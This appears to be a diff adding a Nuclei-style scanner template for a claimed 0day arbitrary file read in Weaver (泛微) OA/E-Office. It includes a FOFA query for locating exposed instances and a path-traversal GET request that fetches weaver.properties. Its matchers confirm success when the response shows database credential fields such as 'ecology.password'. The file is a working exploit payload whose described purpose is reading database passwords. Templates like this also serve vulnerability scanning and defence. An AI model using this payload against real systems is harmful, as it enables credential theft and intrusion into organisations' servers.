@@ -1,0 +1,32 @@
+id: oa泛微0day任意文件读取.py
+
+info:
+  name: oa泛微0day任意文件读取.py
+  severity: medium
+  description: 泛微0day 任意文件读取。可直接读取数据库账号密码
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: app="泛微-EOffice"
+  tags: fanwei,ecology,exposure,config
+
+http:
+  - method: 
+      - GET
+    path:
+      - "{{BaseURL}}/api/portalTsLogin/utils/getE9DevelopAllNameValue2?fileName=portaldev_%2f%2e%2e%2fweaver%2eproperties"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "ecology.password"
+          - "ecology.charset"
+          - "ecology.maxidletime"
+        condition: and
+
+
+      - type: status
+        status:
+          - 200
